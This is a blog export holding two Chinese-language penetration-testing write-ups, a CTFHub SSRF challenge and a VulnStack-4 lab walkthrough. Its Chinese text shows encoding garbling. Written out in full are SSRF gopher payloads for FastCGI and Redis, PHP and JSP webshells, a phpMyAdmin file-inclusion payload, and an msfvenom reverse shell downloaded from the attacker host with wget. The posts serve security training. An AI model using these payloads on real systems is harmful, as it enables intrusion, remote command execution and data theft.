string">"%0D"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%2F"</span><span class="token punctuation">,</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707200659006.png" alt loading="lazy"></p><p>çœ‹åˆ°flagæ–‡ä»¶<code>flag_488cfa9618a27d4323c5cf9791dd2bcc</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707202019321.png" alt loading="lazy"></p><p>æœ€åç›´æ¥è¯»æ–‡ä»¶</p><pre class="language-shell" data-language="shell"><code class="language-shell">python .\fpm.py &quot;172.22.73.110&quot; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot; -c &quot;&lt;?php system(&#39;cat \&#39;&#x2F;flag_488cfa9618a27d4323c5cf9791dd2bcc\&#39;&#39;); exit; ?&gt;&quot; -p 2333</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707201211951.png" alt loading="lazy"></p><pre class="language-none"><code class="language-none">gopher%3A&#x2F;&#x2F;127.0.0.1%3A9000&#x2F;_%2501%2501%2595%2594%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2595%2594%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI&#x2F;1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250B%2517SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250D%2501DOCUMENT_ROOT&#x2F;%250F%250ESERVER_SOFTWAREphp&#x2F;fcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP&#x2F;1.1%250C%2510CONTENT_TYPEapplication&#x2F;text%250E%2502CONTENT_LENGTH69%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A&#x2F;&#x2F;input%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504%2595%2594%2500%2500%2500%2500%2501%2505%2595%2594%2500E%2500%2500%253C%253Fphp%2520system%2528%2527find%2520&#x2F;%2520-name%2520%255C%2527%252A%255C%2527%2520%257C%2520xargs%2520grep%2520%255C%2527ctfhub%257B%255C%2527%2527%2529%253B%2520exit%253B%2520%253F%253E%2501%2505%2595%2594%2500%2500%2500%2500</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707201513621.png" alt loading="lazy"></p><h3 id="Redisåè®®"><a href="#Redisåè®®" class="headerlink" title="Redisåè®®"></a>Redisåè®®</h3><p>é¢˜ç›®æç¤º<code>è¿™æ¬¡æ¥æ”»å‡»redisåè®®å§.redis://127.0.0.1:6379,èµ„æ–™?æ²¡æœ‰èµ„æ–™!è‡ªå·±æ‰¾!</code></p><p>ä½¿ç”¨è„šæœ¬ç”Ÿæˆpayloadï¼Œpython2ä¸‹è·‘</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">,</span>requestsprotocol<span class="token operator">=</span><span class="token string">"gopher://"</span>ip<span class="token operator">=</span><span class="token string">"127.0.0.1"</span>port<span class="token operator">=</span><span class="token string">"6379"</span>shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_POST[\"shell\"]);?>\n\n"</span>filename<span class="token operator">=</span><span class="token string">"shell.php"</span>path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>passwd<span class="token operator">=</span><span class="token string">""</span>cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>     <span class="token string">"set 1 &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"config set dir &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"config set dbfilename &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"save"</span>     <span class="token punctuation">]</span><span class="token keyword">if</span> passwd<span class="token punctuation">:</span>    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span><span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    cmd<span class="token operator">=</span><span class="token string">""</span>    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>    cmd<span class="token operator">+=</span>CRLF    <span class="token keyword">return</span> cmd<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> result</code></pre><pre class="language-none"><code class="language-none">gopher%3A&#x2F;&#x2F;127.0.0.1%3A6379&#x2F;_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522shell%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A&#x2F;var&#x2F;www&#x2F;html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</code></pre><p>å°†ç”Ÿæˆçš„ç»“æœç›´æ¥ä¼ ç»™urlï¼Œè®¿é—®</p><p>ç„¶åè®¿é—®shell.php</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707212626096.png" alt loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå†™å…¥ï¼Œç„¶åæ‰¾flagï¼Œç›´æ¥catå³å¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707212729350.png" alt loading="lazy"></p><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>é¢˜ç›®æç¤º<code>è¯·æ±‚çš„URLä¸­å¿…é¡»åŒ…å«http://notfound.ctfhub.comï¼Œæ¥å°è¯•åˆ©ç”¨URLçš„ä¸€äº›ç‰¹æ®Šåœ°æ–¹ç»•è¿‡è¿™ä¸ªé™åˆ¶å§</code></p><p>å¯ä»¥ç”¨<code>@</code>ç»•è¿‡ï¼Œ<code>http://whoami@127.0.0.1</code>å®é™…ä¸Šæ˜¯ä»¥ç”¨æˆ·å <code>whoami</code> è¿æ¥åˆ°ç«™ç‚¹<code>127.0.0.1</code></p><p>payload</p><pre class="language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210708151728102.png" alt loading="lazy"></p><h3 id="æ•°å­—IP-Bypass"><a href="#æ•°å­—IP-Bypass" class="headerlink" title="æ•°å­—IP Bypass"></a>æ•°å­—IP Bypass</h3><p>é¢˜ç›®æç¤º<code>è¿™æ¬¡banæ‰äº†127ä»¥åŠ172.ä¸èƒ½ä½¿ç”¨ç‚¹åˆ†åè¿›åˆ¶çš„IPäº†ã€‚ä½†æ˜¯åˆè¦è®¿é—®127.0.0.1ã€‚è¯¥æ€ä¹ˆåŠå‘¢</code></p><p>å¯ä»¥ç”¨åè¿›åˆ¶ç»•è¿‡ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ˜¯ç”¨å…«è¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶ï¼Œä½†æ˜¯éƒ½éœ€è¦ç”¨åˆ°<code>.</code></p><pre class="language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;2130706433&#x2F;flag.php</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210708154141264.png" alt loading="lazy"></p><p>å¦å¤–è¿˜æœ‰ä¸€ç§æ€è·¯ï¼Œ<code>åˆ©ç”¨å…¶ä»–å„ç§æŒ‡å‘127.0.0.1çš„åœ°å€</code>ï¼Œå­¦ä¹ äº†</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;http:&#x2F;&#x2F;0&#x2F;http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;http:&#x2F;&#x2F;â‘ â‘¡â‘¦.â“ª.â“ª.â‘ </code></pre><h3 id="302è·³è½¬-Bypass"><a href="#302è·³è½¬-Bypass" class="headerlink" title="302è·³è½¬ Bypass"></a>302è·³è½¬ Bypass</h3><p>é¢˜ç›®æç¤º<code>SSRFä¸­æœ‰ä¸ªå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯è¯·æ±‚å¯èƒ½ä¼šè·Ÿéš302è·³è½¬ï¼Œå°è¯•åˆ©ç”¨è¿™ä¸ªæ¥ç»•è¿‡å¯¹IPçš„æ£€æµ‹è®¿é—®åˆ°ä½äº127.0.0.1çš„flag.phpå§</code></p><p>è¿˜æ˜¯ä¸Šé¢ä¸€æ ·çš„æ–¹æ³•ç›´æ¥ç»•äº†</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210708155539943.png" alt loading="lazy"></p><p>å¦å¤–è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œç”¨çŸ­é“¾æ¥ï¼Œ<a href="http://4m.cn">http://4m.cn</a></p><h3 id="DNSé‡ç»‘å®š-Bypass"><a href="#DNSé‡ç»‘å®š-Bypass" class="headerlink" title="DNSé‡ç»‘å®š Bypass"></a>DNSé‡ç»‘å®š Bypass</h3><p>é¢˜ç›®æç¤º<code>å…³é”®è¯ï¼šDNSé‡ç»‘å®šã€‚å‰©ä¸‹çš„è‡ªå·±æ¥å§ï¼Œä¹Ÿè®¸é™„ä»¶ä¸­çš„é“¾æ¥èƒ½æœ‰äº›å¸®åŠ©</code></p><p>é™„ä»¶ç»™çš„é“¾æ¥ï¼š<a href="https://zhuanlan.zhihu.com/p/89426041">https://zhuanlan.zhihu.com/p/89426041</a></p><p>ç†è§£åå®è·µ</p><p>æˆ‘ä»¬åœ¨ <a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a> è¿™ä¸ªç½‘ç«™ä¸Šè·å–ä¸€ä¸ªæµ‹è¯•ç”¨çš„åŸŸåï¼Œå½“ç„¶è¿™ä¸ªç½‘ç«™ç›®çš„å°±æ˜¯ç”¨æ¥æµ‹DNSé‡ç»‘å®šæ¼æ´çš„ï¼Œæ‹¿åˆ°ç”Ÿæˆçš„åŸŸå<code>7f000001.2f6aa0b0.rbndr.us</code></p><p>è¯·æ±‚ï¼Œå¦‚æœæ˜¯404å°±æŒ‰F5åˆ·æ–°</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210708160940884.png" alt loading="lazy"></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://www.freebuf.com/articles/web/258365.html">æˆ‘åœ¨CTFHubå­¦ä¹ SSRF</a></li><li><a href="https://wh0ale.github.io/2019/01/22/2019-1-20-SSRF%E8%AF%A6%E8%A7%A3/">ssrfè¯¦è§£</a></li><li><a href="https://bbs.ichunqiu.com/thread-58455-1-1.html">SSRFç³»åˆ—ä¹‹æ”»å‡»FastCGI</a></li><li><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™</a></li><li><a href="https://xz.aliyun.com/t/5665">æµ…æRedisä¸­SSRFçš„åˆ©ç”¨</a></li><li><a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html">åˆ©ç”¨rediså†™webshell</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFé¢˜ </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack-4é¶åœºç»ƒä¹ </title>
      <link href="posts/b57d0eac/"/>
      <url>posts/b57d0eac/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡å…¨ç¨‹å‚è€ƒ <a href="https://www.freebuf.com/articles/network/244704.html">è®°ä¸€æ¬¡Vulnstacké¶åœºå†…ç½‘æ¸—é€ï¼ˆäºŒï¼‰</a> æ¥å¤ç°æ¸—é€è¿‡ç¨‹ï¼Œç›®çš„åœ¨äºå­¦ä¹ æ¸—é€æµç¨‹å’ŒåŸºæœ¬æ€è·¯ï¼Œè®°å½•ä¸‹å­¦ä¹ ç¬”è®°</p><span id="more"></span><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>é¶æœºåœ°å€ï¼š<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p><p>å­¦ä¹ æ€è·¯ï¼šstæ¼æ´åˆ©ç”¨ã€phpmyadmin getshellã€tomcat æ¼æ´åˆ©ç”¨ã€dockeré€ƒé€¸ã€ms14-068ã€sshå¯†é’¥åˆ©ç”¨ã€æµé‡è½¬å‘ã€å†å²å‘½ä»¤ä¿¡æ¯æ³„éœ²ã€åŸŸæ¸—é€</p><p>æ”»å‡»æœºKali (192.168.0.106)</p><p>è™šæ‹Ÿç½‘å¡é…ç½®</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630130756345.png" alt loading="lazy"></p><p>Ubuntu webæœåŠ¡å™¨ç½‘å¡é…ç½®ï¼Œé…ä¸¤å¼ ç½‘å¡ï¼ˆ192.168.0.105ï¼Œ192.168.183.128ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131230765.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131200044.png" alt loading="lazy"></p><p>DC Windows Server 2008 R2æœåŠ¡å™¨ç½‘å¡é…ç½®ï¼ˆ192.168.183.130ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131335941.png" alt loading="lazy"></p><p>Windows 7ç½‘å¡é…ç½®ï¼ˆ192.168.183.129ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131525870.png" alt loading="lazy"></p><p>ç„¶åæŠŠdockerå®¹å™¨éƒ½å¼€èµ·æ¥ï¼Œé¶æœºé‡Œæœ‰vulhubï¼Œç›´æ¥æ‹‰å°±è¡Œäº†ï¼Œè¿™é‡Œæ‹‰ä¸‰ä¸ª</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/struts/s2-045docker-compose up -d<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/tomcat/CVE-2017-12615docker-compose up -d<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/phpmyadmin/CVE-2018-12613docker-compose up -d</code></pre><p>åˆ†åˆ«å¯¹åº”</p><ul><li><strong>s2-045</strong></li><li><strong>CVE-2017-12615(tomcat putä¸Šä¼ )</strong></li><li><strong>CVE-2018-12613(phpmyadminæ–‡ä»¶åŒ…å«æ¼æ´)</strong></li></ul><p>dockerå¼€å¯æƒ…å†µå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210707093959463.png" alt loading="lazy"></p><p>åˆå§‹å¯†ç </p><ul><li>fæœåŠ¡å™¨ï¼šubuntu-&gt;ubuntu</li><li>åŸŸæˆå‘˜Win7ï¼šdouser-&gt;Dotest123</li><li>åŸŸæ§DCï¼šadministrator-&gt;Test2008</li></ul><p>é¶æœºç¯å¢ƒæ‹“æ‰‘ï¼ˆipåœ°å€åœ¨æ–‡ä¸­å¯èƒ½å˜åŒ–ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210707093500532.png" alt loading="lazy"></p><p><strong>ç›®æ ‡ï¼š</strong></p><p>åŸŸæ§ä¸­å­˜åœ¨ä¸€ä»½é‡è¦æ–‡ä»¶â€”â€”ã€Šæ¼‚äº®å›½ç½‘ç»œæ”»å‡»æˆæƒæŠ¥å‘Šã€‹ã€‚</p><h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><p>nmapä¿¡æ¯æœé›†</p><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -T4 -A -sN <span class="token number">192.168</span>.0.105</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704205813557.png" alt loading="lazy"></p><p>æœ‰<code>ssh</code>ï¼Œ<code>struts2</code>ï¼Œ<code>tomcat</code>ï¼Œ<code>phpmyadmin</code>ç­‰æœåŠ¡</p><h3 id="Webæ¸—é€"><a href="#Webæ¸—é€" class="headerlink" title="Webæ¸—é€"></a>Webæ¸—é€</h3><h4 id="struts2æ¸—é€"><a href="#struts2æ¸—é€" class="headerlink" title="struts2æ¸—é€"></a>struts2æ¸—é€</h4><p>ç›´æ¥ä¸Šå·¥å…·æ‰«ä¸€ä¸‹ï¼Œå·¥å…·åœ°å€ï¼š<a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210707124315972.png" alt loading="lazy"></p><p>å­˜åœ¨s2-045ï¼ŒRCE</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210707124347853.png" alt loading="lazy"></p><h4 id="phpmyadminæ¸—é€"><a href="#phpmyadminæ¸—é€" class="headerlink" title="phpmyadminæ¸—é€"></a>phpmyadminæ¸—é€</h4><p>çœ‹åˆ°<code>phpmyadmin</code>ç‰ˆæœ¬ä¸º4.8.1ï¼Œæƒ³åˆ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2018-12613ï¼‰</p><pre class="language-shell" data-language="shell"><code class="language-shell">searchsploit phpmyadmin <span class="token number">4.8</span>.1</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142047587.png" alt loading="lazy"></p><p>æµ‹è¯•payloadï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.105:2003/index.php?target=db_sql.php%253f/../../../../../etc/passwd</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704205952878.png" alt loading="lazy"></p><p>åˆ©ç”¨<code>session</code>æ–‡ä»¶åŒ…å«ï¼ŒæŸ¥è¯¢ä¸€æ¡<code>sql</code>è¯­å¥ï¼Œ<code>file_put_contents</code>å†™æ–‡ä»¶</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT &#39;&lt;?php file_put_contents(&quot;extrader.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4&#x3D;&quot;));?&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704210700760.png" alt loading="lazy"></p><p><code>cookie</code>ä¸­<code>phpMyAdmin</code>çš„å€¼ä¸º<code>d70bbb50bbcc99dde55870cf69eda13b</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704210737586.png" alt loading="lazy"></p><p>è®¿é—®<code>http://192.168.0.105:2003/index.php?target=db_sql.php%3f../../../../../../../tmp/sess_d70bbb50bbcc99dde55870cf69eda13b</code>ï¼ŒæŠŠshellå†™è¿›å»</p><p>éšåèšå‰‘è¿æ¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211035539.png" alt loading="lazy"></p><p>æˆåŠŸè¿æ¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211100989.png" alt loading="lazy"></p><h4 id="tomcatæ¸—é€"><a href="#tomcatæ¸—é€" class="headerlink" title="tomcatæ¸—é€"></a>tomcatæ¸—é€</h4><pre class="language-shell" data-language="shell"><code class="language-shell">searchsploit tomcat <span class="token number">8.5</span>.19</code></pre><p>ç”±nmapæ‰«æä¿¡æ¯å¯çŸ¥ï¼Œ2002ç«¯å£çš„Tomcatç‰ˆæœ¬ä¸º8.5.19ï¼Œsearchä¸€ä¸‹å‘ç°æœ‰æ´</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142226990.png" alt loading="lazy"></p><p>ç”¨ç¬¬ä¸€ä¸ªè„šæœ¬è¿›è¡Œexploit</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142742574.png" alt loading="lazy"></p><p>æˆåŠŸæ‹¿åˆ°rootæƒé™</p><p>åˆ©ç”¨æ¼æ´åŸç†ä¼ ä¸ªshellï¼Œå¥½æ‰§è¡Œå‘½ä»¤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630144121828.png" alt loading="lazy"></p><pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;&lt;%%&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD&#x3D;&quot;POST&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;&lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;&lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;&lt;&#x2F;FORM&gt;&lt;pre&gt;&lt;%if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;    out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&quot;);    Process p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));    OutputStream os &#x3D; p.getOutputStream();    InputStream in &#x3D; p.getInputStream();    DataInputStream dis &#x3D; new DataInputStream(in);    String disr &#x3D; dis.readLine();    while ( disr !&#x3D; null ) &#123;        out.println(disr); disr &#x3D; dis.readLine();     &#125;&#125;%&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630144244721.png" alt loading="lazy"></p><h3 id="Dockerä¸»æœºé€ƒé€¸"><a href="#Dockerä¸»æœºé€ƒé€¸" class="headerlink" title="Dockerä¸»æœºé€ƒé€¸"></a>Dockerä¸»æœºé€ƒé€¸</h3><p><strong>msfå¼¹shell</strong></p><pre class="language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.106 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f elf <span class="token operator">></span> shell.elf</code></pre><p>ç”Ÿæˆä¸€ä¸ª<code>msf</code>é©¬<code>shell.elf</code></p><p>åœ¨æœ¬åœ°ç”¨pythonå¼€ä¸€ä¸ªhttpæœåŠ¡</p><pre class="language-shell" data-language="shell"><code class="language-shell">python3 -m http.server</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211900711.png" alt loading="lazy"></p><p>ä¸‹è½½shellå¹¶ç»™æƒé™</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">wget</span> http://192.168.0.106:8000/shell.elf<span class="token function">chmod</span> <span class="token number">777</span> shell.elf</code></pre><p>kaliæœºå¼€å¯ç›‘å¬</p><pre class="language-shell" data-language="shell"><code class="language-shell">msfconsoleuse exploit/multi/handler<span class="token builtin class-name">set</span> PAYLOAD linux/x86/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.183.1show optionsrun</code></pre><p><img 